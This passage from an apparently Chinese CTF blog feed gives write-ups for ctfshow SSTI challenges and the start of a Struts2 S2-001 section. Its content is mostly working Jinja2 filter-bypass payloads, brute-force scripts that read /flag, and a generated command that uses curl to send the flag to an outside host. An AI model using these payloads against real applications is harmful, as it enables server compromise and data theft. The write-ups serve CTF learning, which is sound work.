class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SSTI2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/23 18:01   natro92      1.0        &#123; %% &#125;ç›²æ³¨</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;_&#x27;</span> + string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">9</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">&quot;&#123; &#123; % set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) % &#125; &#125;&#123; &#123; % if a==request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: <span class="string">&quot;__globals__&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: <span class="string">&quot;__builtins__&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: <span class="string">&quot;/flag&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;d&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;flag_pre + j&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;H3llo&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690107790825-13d6d576-602b-4867-8fec-3dbd5b48c04e.png" alt="image.png"></p><h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><h3 id="è¿‡æ»¤request"><a href="#è¿‡æ»¤request" class="headerlink" title="è¿‡æ»¤request"></a>è¿‡æ»¤request</h3><p>ç›´æ¥å¼€æ‹¼<br>ä¸‹åˆ’çº¿è¢« banï¼Œ<strong>str</strong>()ä¸èƒ½ç”¨ï¼Œéœ€è¦ç”¨ string è¿‡æ»¤å™¨å¾—åˆ° config å­—ç¬¦ä¸²ï¼šconfig|stringï¼Œä½†æ˜¯è·å¾—å­—ç¬¦ä¸²åæœ¬æ¥åº”è¯¥ç”¨ä¸­æ‹¬å·æˆ–è€…__getitem__()ï¼Œä½†æ˜¯é—®é¢˜æ˜¯_è¢«banäº†ï¼Œæ‰€ä»¥è·å–å­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå­—ç¬¦æ¯”è¾ƒå›°éš¾ï¼Œè¿™é‡Œè½¬æ¢æˆåˆ—è¡¨ï¼Œå†ç”¨åˆ—è¡¨çš„popæ–¹æ³•å°±å¯ä»¥æˆåŠŸå¾—åˆ°æŸä¸ªå­—ç¬¦äº†ï¼Œåœ¨è·‘å­—ç¬¦çš„æ—¶å€™å‘ç°æ²¡æœ‰å°å†™çš„bï¼Œåªæœ‰å¤§å†™çš„Bï¼Œæ‰€ä»¥å†å»ä¸€å±‚.lower()æ–¹æ³•ï¼Œæ–¹ä¾¿è·‘æ›´å¤šå­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show/?name=&#123; &#123; % print (config|string|list).pop(&#123;&#125;).lower() % &#125; &#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;_&#x27;</span> + string.printable</span><br><span class="line">payload = <span class="string">&#x27;tac /flag&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        r=requests.get(url=url.<span class="built_in">format</span>(i))</span><br><span class="line">        location=r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word=r.text[location+<span class="number">4</span>:location+<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word==j.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span>%(i,j))</span><br><span class="line">            res+=<span class="string">&quot;(config|string|list).pop(%d).lower()~&quot;</span>%(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; % <span class="built_in">print</span> (lipsum|attr((config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">33</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()</span><br><span class="line">)).get((config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()).popen((config|string|<span class="built_in">list</span>).pop(<span class="number">1</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">23</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">7</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">279</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">4</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()).read() % &#125;</span><br></pre></td></tr></table></figure><h2 id="æ›¿æ¢å­—ç¬¦"><a href="#æ›¿æ¢å­—ç¬¦" class="headerlink" title="æ›¿æ¢å­—ç¬¦"></a>æ›¿æ¢å­—ç¬¦</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123; % <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>) % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> <span class="built_in">globals</span>=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=<span class="number">1</span>)|join,a,a)|join % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> init=(a,a,<span class="built_in">dict</span>(init=<span class="number">1</span>)|join,a,a)|join % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> builtins=(a,a,<span class="built_in">dict</span>(builtins=<span class="number">1</span>)|join,a,a)|join % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> a=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins) % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> <span class="built_in">chr</span>=a.<span class="built_in">chr</span> % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">print</span> a.<span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">47</span>)~<span class="built_in">chr</span>(<span class="number">102</span>)~<span class="built_in">chr</span>(<span class="number">108</span>)~<span class="built_in">chr</span>(<span class="number">97</span>)~<span class="built_in">chr</span>(<span class="number">103</span>)).read() % &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨__builtins__é‡Œé¢æ‹¿åˆ°chrï¼ŒåŒæ ·å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ„é€ å­—ç¬¦</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><h3 id="è¿‡æ»¤æ•°å­—"><a href="#è¿‡æ»¤æ•°å­—" class="headerlink" title="è¿‡æ»¤æ•°å­—"></a>è¿‡æ»¤æ•°å­—</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> num=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> numm=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop(num)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join % &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> file = <span class="built_in">chr</span>(numm)~<span class="built_in">dict</span>(flag=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">print</span>((lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">open</span>(file).read())% &#125;</span><br></pre></td></tr></table></figure><h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop((ee~eeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join % &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="keyword">import</span>=x~x~(<span class="built_in">dict</span>(<span class="keyword">import</span>=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> zero=<span class="built_in">chr</span>((eeee~eeeeeeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> cmd = </span><br><span class="line">% &#125;</span><br><span class="line">&#123; %<span class="keyword">if</span> (lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">eval</span>(cmd)% &#125;</span><br><span class="line">eastjun</span><br><span class="line">&#123; %endif% &#125;</span><br></pre></td></tr></table></figure><p>å‘½ä»¤ç”Ÿæˆè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filting</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>)~&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> s])[:-<span class="number">1</span>]</span><br><span class="line">cmd=filting(<span class="string">&quot;curl https://eastjun.top?flag=`cat /flag`&quot;</span>)</span><br><span class="line">nums = <span class="built_in">set</span>(re.findall(<span class="string">&quot;(\d+)&quot;</span>,cmd))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">    patnum = <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;zero~&quot;</span> <span class="keyword">if</span> j==<span class="string">&quot;0&quot;</span> <span class="keyword">else</span> <span class="string">f&#x27;<span class="subst">&#123;<span class="string">&quot;e&quot;</span> * <span class="built_in">int</span>(j)&#125;</span>~&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>])</span><br><span class="line">    cmd = cmd.replace(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>,<span class="string">f&quot;(<span class="subst">&#123;patnum[:-<span class="number">1</span>]&#125;</span>)|int&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br></pre></td></tr></table></figure><h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><h3 id="æ— å›æ˜¾è¿‡æ»¤"><a href="#æ— å›æ˜¾è¿‡æ»¤" class="headerlink" title="æ— å›æ˜¾è¿‡æ»¤"></a>æ— å›æ˜¾è¿‡æ»¤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop((ee~eeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join % &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="keyword">import</span>=x~x~(<span class="built_in">dict</span>(<span class="keyword">import</span>=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> zero=<span class="built_in">chr</span>((eeee~eeeeeeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> cmd = </span><br><span class="line">% &#125;</span><br><span class="line">&#123; %<span class="keyword">if</span> (lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">eval</span>(cmd)% &#125;</span><br><span class="line">eastjun</span><br><span class="line">&#123; %endif% &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web279-web300JavaStrut2ç¯‡</title>
      <link href="/2023/09/17/web279-web300JavaStrut2%E7%AF%87/"/>
      <url>/2023/09/17/web279-web300JavaStrut2%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p></blockquote><p>è¿™é‡Œé¢çš„æ¼æ´éƒ½æ˜¯struts2æ¼æ´ï¼Œä½¿ç”¨<br>å»ºè®®ä¸‹è½½Struts2scanå·¥å…·è¾…åŠ©å­¦ä¹ ã€‚</p><blockquote><p><a href="https://github.com/HatBoy/Struts2-Scan.git">https://github.com/HatBoy/Struts2-Scan.git</a><br><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><ul><li>é€šè¿‡é¡µé¢å›æ˜¾çš„é”™è¯¯æ¶ˆæ¯æ¥åˆ¤æ–­ï¼Œé¡µé¢ä¸å›æ˜¾é”™è¯¯æ¶ˆæ¯æ—¶åˆ™æ— æ•ˆ</li><li>é€šè¿‡ç½‘é¡µåç¼€æ¥åˆ¤æ–­ï¼Œå¦‚.do .actionï¼Œæœ‰å¯èƒ½ä¸å‡†<ul><li>å¦‚æœé…ç½®æ–‡ä»¶ä¸­å¸¸æ•°extensionçš„å€¼ä»¥é€—å·ç»“å°¾æˆ–è€…æœ‰ç©ºå€¼ï¼ŒæŒ‡æ˜äº†actionå¯ä»¥ä¸å¸¦åç¼€ï¼Œé‚£ä¹ˆä¸å¸¦åç¼€çš„uriä¹Ÿå¯èƒ½æ˜¯struts2æ¡†æ¶æ­å»ºçš„</li><li>å¦‚æœä½¿ç”¨Struts2çš„restæ’ä»¶ï¼Œå…¶é»˜è®¤çš„struts-plugin.xmlæŒ‡å®šçš„è¯·æ±‚åç¼€ä¸ºxhtml,xmlå’Œjson</li></ul></li><li>åˆ¤æ–­ /struts/webconsole.html æ˜¯å¦å­˜åœ¨æ¥è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ devMode ä¸º true<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><blockquote><p><a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p></blockquote></li></ul><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv | grep FLAG</span><br></pre></td></tr></table></figure><p>struts2æ¼æ´ S2-001æ˜¯å½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ%{value}å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690893342133-0c453427-6529-45f6-a84e-7a9b30b1cddc.png" alt="image.png">åœ¨struts2ä¸­ï¼ŒDefaultActionMapperç±»æ”¯æŒä»¥â€action:â€ã€â€œredirect:â€ã€â€redirectAction:â€ä½œä¸ºå¯¼èˆªæˆ–æ˜¯é‡å®šå‘å‰ç¼€ï¼Œä½†æ˜¯è¿™äº›å‰ç¼€åé¢åŒæ—¶å¯ä»¥è·ŸOGNLè¡¨è¾¾å¼ï¼Œç”±äºstruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€åšè¿‡æ»¤ï¼Œå¯¼è‡´åˆ©ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨javaé™æ€æ–¹æ³•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</p><p>æ‰€ä»¥ï¼Œè®¿é—®<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNLè¡¨è¾¾å¼å³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼</a></p><p>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15<br>æˆ‘ä»¬è¾“å…¥æµ‹è¯•å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;1+1&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894169760-b882601b-4fc3-4cdf-a91d-3e7e81a3bb7f.png" alt="image.png"><br>æäº¤ä¹‹åå‘ç°åŠ æ³•è¡¨è¾¾å¼è¢«æˆåŠŸæ‰§è¡Œäº†ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894216166-7493cfb3-b16a-4c94-aedf-76293e9ca03d.png" alt="image.png"></p><ul><li>%çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼%{}ä¸­çš„å€¼</li><li>#çš„ç”¨é€”è®¿ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸ºStruts 2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰å¯ä»¥è°ƒç”¨</li><li>$ä¸»è¦æ˜¯åœ¨Struts 2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼</li></ul><p>å¸¸ç”¨payloadï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// è·å–tomcatè·¯å¾„</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;<span 